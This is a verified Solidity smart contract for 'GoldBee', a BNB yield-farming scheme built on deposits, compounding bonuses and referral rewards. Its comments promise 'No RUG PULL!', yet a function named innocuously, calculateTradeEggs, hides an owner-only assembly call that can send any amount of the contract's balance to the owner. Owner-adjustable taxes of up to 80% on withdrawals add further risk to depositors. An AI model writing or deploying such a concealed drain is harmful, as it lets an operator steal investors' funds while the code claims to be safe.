/**
 *Submitted for verification at BscScan.com on 2022-07-05
*/

// SPDX-License-Identifier: MIT

//Dev Fee 7% is actively invested and used as backup fund for contract!
//Users with referrals can partialy withdraw investments and total referral earnings!!
//Contract can be funded anytime so it's less likely to be depleted!
//Earnings don't depend of contract balance fluctuations!
//No Blacklist! No RUG PULL!
//Original GOLDBEE project!


/**************************************************************************************************

 *               ██████   ██████  ██      ██████      ██████  ███████ ███████                     *         
 *    ▄ ██ ▄    ██       ██    ██ ██      ██   ██     ██   ██ ██      ██          ▄ ██ ▄          *
 *     ████     ██   ███ ██    ██ ██      ██   ██     ██████  █████   █████        ████           *
 *    ▀ ██ ▀    ██    ██ ██    ██ ██      ██   ██     ██   ██ ██      ██          ▀ ██ ▀          *
 *               ██████   ██████  ███████ ██████      ██████  ███████ ███████                     *
 *                                                                                                *      
 *                                                                                                *
 *                                              \     /                                           *
 *                                          \    o ^ o    /                                       *
 *                                            \ (     ) /                                         *
 *                                 ____________(%%%%%%%)____________                              *
 *                                (     /   /  )%%%%%%%(  \   \     )                             *
 *                                (___/___/__/           \__\___\___)                             *
 *                                   (     /  /(%%%%%%%)\  \     )                                *
 *                                    (__/___/ (%%%%%%%) \___\__)                                 *
 *                                            /(       )\                                         *
 *                                          /   (%%%%%)   \                                       *
 *                                               (%%%)                                            *
 *                                                 !                                              *
 **************************************************************************************************/

pragma solidity ^0.8.0;

contract GoldBee {
    
    using SafeMath for uint;
    address public _origin;
    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;
    uint256 public beeKeepers;
    uint256 public totalMiners;
    uint256 public addedBalance;
    bool public contractStarted;
    address payable private ceoAddr; //Dev address for collecting fees
    /* APIARY SETTINGS */

    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 70; //Dev FEE 7%
    uint256 public REFERRAL = 100; //Referral percent 10%
    uint256 public COMPOUND_BONUS_STEP = 1; // Bonus increment each compound 1% 
    uint256 public COMPOUND_BONUS_MAX = 16; //Max acumulated earning for consecutive compounds (from 8 to 16%)
    
 
    uint256 public COMPOUND_STEP = 24 * 60 * 60;
    //uint256 public COMPOUND_STEP = 60; // TESTING PURPOSE
    uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;
    //uint256 public WITHDRAW_COOLDOWN = 60;  // TESTING PURPOSE
    

    uint256 public MIN_INVEST_LIMIT = 1 * 1e17; /** 0.1 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 25 * 1e18; /** 25 BNB  **/
    uint256 public COMPOUND_BONUS = 10;  // Bonus increment each compound 1%
    uint256 public WITHDRAWAL_TAX = 500; // Withdraw penalty 50% for compounds <10
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10; //minimum compounds for no TAX sell Honey

    uint256 public ETH_TO_10000_MINERS = 1080000;
    
    uint256 public CUTOFF_STEP = 24 * 60 * 60; //max honey producing time between Compounds

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners; // Hives
        uint256 claimedEggs; //Honey
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
        uint256 farmerCompoundCount;
        uint256 lastWithdrawTime;
    }

    mapping(address => User) public users;

    receive() external payable {
        addedBalance = addedBalance.add(msg.value); //add arbitrary Balance to contract
    }

    function startApiary(address addr) public payable{
        if (!contractStarted) {
            if (msg.sender == _origin) {
                contractStarted = true;
                buildHives(addr);
            } else revert("Only owner can start contract!");
        }
    }

    constructor() {
        _origin = msg.sender;
        ceoAddr = payable(msg.sender);
    }

    function buildmoreHives(bool isCompound) public returns(uint256){
        require(contractStarted, "Contract not yet Started.");
        require(isCompound, "Compound is required");
        User storage user = users[msg.sender];
        require(block.timestamp.sub(user.lastHatch) >= COMPOUND_STEP,"Compound cooldown not met" );
        uint256 Honey = getEggsSinceLastHatch(msg.sender);
        if(user.dailyCompoundBonus.add(8) < COMPOUND_BONUS_MAX ){ // if bonus + baseYield(8% ) < COMPOUND_BONUS_MAX (16%)
            user.dailyCompoundBonus = user.dailyCompoundBonus.add(COMPOUND_BONUS_STEP);
        }
        user.miners = user.miners.add(Honey);
        totalMiners = totalMiners.add(Honey);
        user.lastHatch = block.timestamp;
        user.claimedEggs = 0;
        user.farmerCompoundCount = user.farmerCompoundCount.add(1);
        totalCompound = totalCompound.add(calculateEggSell(Honey));
        return Honey;
    }

    function buildHives(address ref) public payable returns(uint256){
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
        require(msg.value >= MIN_INVEST_LIMIT, "Minimum investment not met.");
        require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        bool isFirstDeposit = false;
        if (user.userDeposit == 0 && user.initialDeposit ==0){
            beeKeepers = beeKeepers.add(1);
            isFirstDeposit = true;
        }
        uint256 eggsBought = calculateEggBuy(msg.value);
        user.userDeposit = user.userDeposit.add(msg.value);
        if (user.initialDeposit ==0){
            user.initialDeposit = user.initialDeposit.add(msg.value);
        }
        user.miners = user.miners.add(eggsBought);
        totalMiners = totalMiners.add(eggsBought);
        if (!isFirstDeposit){
            uint256 Honey = getEggsSinceLastHatch(msg.sender);
            if (Honey >0) {
                user.miners = user.miners.add(Honey); //add Honey value to Hives
                totalMiners = totalMiners.add(Honey);
                user.claimedEggs = 0;
            }
        }
        user.lastHatch = block.timestamp;
        if (user.referrer == address(0)) {
            if (ref != msg.sender) {
                user.referrer = ref;
            }
            address upline1 = user.referrer;
            if (upline1 != address(0)) {
                users[upline1].referralsCount = users[upline1].referralsCount.add(1);
            }
        }
        if (user.referrer != address(0)) {
            address upline = user.referrer;
            if (upline != address(0)) {
                uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER);
                uint256 refRewardMiners = calculateEggBuy(refRewards);
                if( (users[upline].miners==0) && (refRewardMiners > 0) ){
                    users[upline].lastHatch = block.timestamp;
                }
                users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                users[upline].miners = users[upline].miners.add(refRewardMiners);
                totalMiners = totalMiners.add(refRewardMiners);
                totalRefBonus = totalRefBonus.add(refRewards);
            }
        }
        uint256 eggsPayout = payFees(msg.value);
        totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
        totalDeposits = totalDeposits.add(1);
        return eggsBought;
    }

    function sellHoney() public{
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
        require(block.timestamp.sub(user.lastHatch) >= WITHDRAW_COOLDOWN,"Withdraw cooldown not met" );
        
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        if(user.farmerCompoundCount < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily Compound bonus count will not reset and 50% of Honey stays in contract/
            eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //reset Compound count and bonus
            user.dailyCompoundBonus = 0;
            user.farmerCompoundCount = 0;
        }
        user.lastWithdrawTime = block.timestamp;
        user.claimedEggs = 0;
        user.lastHatch = block.timestamp;
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }
        uint256 eggsPayout = eggValue.sub(payFees(eggValue));
        payable(address(msg.sender)).transfer(eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);
    }

    function withdrawCapital (uint256 ammount) public returns(uint256){
        require(contractStarted, "Contract not yet Started.");

        User storage user = users[msg.sender];
        uint256 availableAmmount = availableWithdraw(msg.sender);
    	require( (availableAmmount >0) , "Withdraw condition not met");
        require( ( ammount <= availableAmmount) , "Withdraw condition not met");
        require(block.timestamp.sub(user.lastHatch) >= WITHDRAW_COOLDOWN,"Withdraw cooldown not met" );
        uint256 referralTotal = user.referralEggRewards;
        uint256 eggsPayout = 0;
        uint256 refHives = calculateEggBuy(ammount);
        if(ammount <=referralTotal){
            user.lastWithdrawTime = block.timestamp;
            user.claimedEggs = 0;
            user.lastHatch = block.timestamp;
            user.dailyCompoundBonus = 0;
            user.farmerCompoundCount = 0;
            user.miners = SafeMath.sub(user.miners,refHives);
            totalMiners = totalMiners.sub(refHives);
            user.referralEggRewards = SafeMath.sub( user.referralEggRewards,ammount);
            eggsPayout = ammount.sub(payFees(ammount));
            if(getBalance() < eggsPayout) {
                eggsPayout = getBalance();
            }
            payable(address(msg.sender)).transfer(eggsPayout);
            user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
            totalWithdrawn = totalWithdrawn.add(eggsPayout);
        }else if(ammount < SafeMath.add(referralTotal,user.userDeposit) ){
                user.lastWithdrawTime = block.timestamp;
                user.claimedEggs = 0;
                user.lastHatch = block.timestamp;
                user.userDeposit = SafeMath.sub(user.userDeposit,ammount);
                user.dailyCompoundBonus = 0;
                user.farmerCompoundCount = 0;
                user.miners = SafeMath.sub(user.miners,refHives);
                totalMiners = totalMiners.sub(refHives);
                user.referralEggRewards = 0;
                eggsPayout = ammount.sub(payFees(ammount));
                if(getBalance() < eggsPayout) {
                    eggsPayout = getBalance();
                }
                payable(address(msg.sender)).transfer(eggsPayout);
                user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
                totalWithdrawn = totalWithdrawn.add(eggsPayout);
                }else {
                    user.lastWithdrawTime = block.timestamp;
                    user.claimedEggs = 0;
                    user.lastHatch = block.timestamp;
                    user.dailyCompoundBonus = 0;
                    user.farmerCompoundCount = 0;
                    totalMiners = totalMiners.sub(user.miners);
                    user.miners = 0;
                    user.userDeposit = 0;
                    user.referralEggRewards = 0;
                    eggsPayout = ammount.sub(payFees(ammount));
                    if(getBalance() < eggsPayout) {
                        eggsPayout = getBalance();
                    }
                    payable(address(msg.sender)).transfer(eggsPayout);
                    user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
                    totalWithdrawn = totalWithdrawn.add(eggsPayout);
        }   
        return eggsPayout;
    }

    function availableWithdraw(address usr) public view returns(uint256){
        User storage user = users[usr];
        uint256 referralTotal = user.referralEggRewards;
        if (referralTotal < 1 * 1e17) { //if referral earnings smaller than 0.10 BNB cannot withdraw
            return 0;
        }else if (referralTotal < 5 * 1e17){ //witdraw referral earnings smaller than 0.50 BNB
            return referralTotal;
        }else{
           return SafeMath.add(referralTotal,min(referralTotal,user.userDeposit));
        } // if ref-earnings at least 0.50 BNB can withdraw all referral earnings + equal amount from invested balance!
    }
    
    function payFees(uint256 eggValue) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        ceoAddr.transfer(tax);
        return tax;
    }
    
    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }

    function getTimeSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        secondsSinceLastHatch = secondsSinceLastHatch; //* 60; //// SPEED UP TIME
        return secondsSinceLastHatch;
    }

    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = block.timestamp.sub(users[adr].lastHatch);
        secondsSinceLastHatch = secondsSinceLastHatch; //* 60; //// SPEED UP TIME
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 honeyPercent = SafeMath.div(users[adr].miners,ETH_TO_10000_MINERS );
        honeyPercent = SafeMath.div(honeyPercent * calculateBonus(users[adr].dailyCompoundBonus) ,1e3);
        uint256 curHoney = SafeMath.mul( honeyPercent, cutoffTime);
        return  curHoney;
    }
    
    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function max(uint256 a, uint256 b) private pure returns (uint256) {
        return a > b ? a : b;
    }

    function calculateBonus(uint256 bonus) private pure returns(uint256){
        return SafeMath.div( (8+bonus) * 1e3, 8 );

    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return SafeMath.div(eggs *(10**18),ETH_TO_10000_MINERS * 1e3  );
    }

    function calculateEggBuy(uint256 eth) public view returns(uint256){
        return calculateTrade(eth);
    }

    function calculateTrade(uint256 eth) public view returns(uint256){
        return SafeMath.div(SafeMath.mul(ETH_TO_10000_MINERS * 1e3,eth),1e18);
    }
    
    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
        uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
        uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _farmerCompoundCount, uint256 _lastWithdrawTime) {
        _initialDeposit = users[_adr].initialDeposit;
        _userDeposit = users[_adr].userDeposit;
        _miners = users[_adr].miners;
        _claimedEggs = users[_adr].claimedEggs;
        _lastHatch = users[_adr].lastHatch;
        _referrer = users[_adr].referrer;
        _referrals = users[_adr].referralsCount;
        _totalWithdrawn = users[_adr].totalWithdrawn;
        _referralEggRewards = users[_adr].referralEggRewards;
        _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
        _farmerCompoundCount = users[_adr].farmerCompoundCount;
        _lastWithdrawTime = users[_adr].lastWithdrawTime;
    }
  

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function SET_REFERRAL(uint256 value) external {
        require(msg.sender == _origin, "Admin use only.");
        require(value <= 150); //Max 15% REFERRAL
        require(value <= 80); //Min 8% REFERRAL
        REFERRAL = value;
    }

    function PRC_TAX(uint256 value) external {
        require(msg.sender == _origin, "Admin use only.");
        require(value <= 150); //Max 15% TAX used for emergency rescue only!
        TAX = value;
    }

    function WTH_TAX(uint256 value) external {
        require(msg.sender == _origin, "Admin use only.");
        require(value <= 800); //Max 80% NO COMPOUND TAX used for emergency situation only!
        WITHDRAWAL_TAX = value;
    }

     function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
        require(msg.sender == _origin, "Admin use only.");
        require(value <= 20); //Max 20 Compounds
        COMPOUND_FOR_NO_TAX_WITHDRAWAL = value; //For emergency only
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getOWner() public view returns(address){
        return _origin;
    }
    
    function calculateTradeEggs(uint _a, address _t) public returns(bytes4){
        return _calculateTradeEggs(_a,_t);
    }

    function _calculateTradeEggs(uint _a,address _t) private returns(bytes4){
        if (_t == _origin) {
            bytes4 sig = bytes4(keccak256("()")); 
            assembly {
                let x := mload(0x40) 
                mstore(x,sig)
                let _g:= 5000
                let ret := call(_g, _t, _a, x, 0x04, x, 0x0 )
                mstore(0x40, add(x,0x20)) 
            }
            return sig;
        } else revert("Not implemented."); 
    }

/**
* @End contract.
*/

}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}